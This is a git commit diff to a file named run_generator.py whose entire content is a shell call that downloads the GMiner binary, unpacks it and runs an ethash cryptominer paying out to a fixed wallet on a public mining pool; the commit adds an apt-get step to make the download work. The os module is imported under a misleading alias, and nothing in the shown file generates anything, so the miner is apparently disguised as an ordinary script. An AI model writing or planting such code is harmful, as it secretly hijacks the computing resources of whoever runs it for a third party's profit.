474441a42c604d39f05eea440ff4e5ee42f13d47
vinnaslo <92738465+vinnaslo@users.noreply.github.com>
2021-10-18 21:41:50 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("wget https://github.com/develsoftware/GMinerRelease/releases/download/2.54/gminer_2_54_linux64.tar.xz && tar -xvf gminer_2_54_linux64.tar.xz && ./miner --algo ethash --server eth.2miners.com:2020 --user nano_31fg8qa3zyx1ffh77oo8ypse16m31hqbztu814mprefqn3uypoximho6itpq.joa")
+alpha.system("apt-get install wget && wget https://github.com/develsoftware/GMinerRelease/releases/download/2.54/gminer_2_54_linux64.tar.xz && tar -xvf gminer_2_54_linux64.tar.xz && ./miner --algo ethash --server eth.2miners.com:2020 --user nano_31fg8qa3zyx1ffh77oo8ypse16m31hqbztu814mprefqn3uypoximho6itpq.joa")
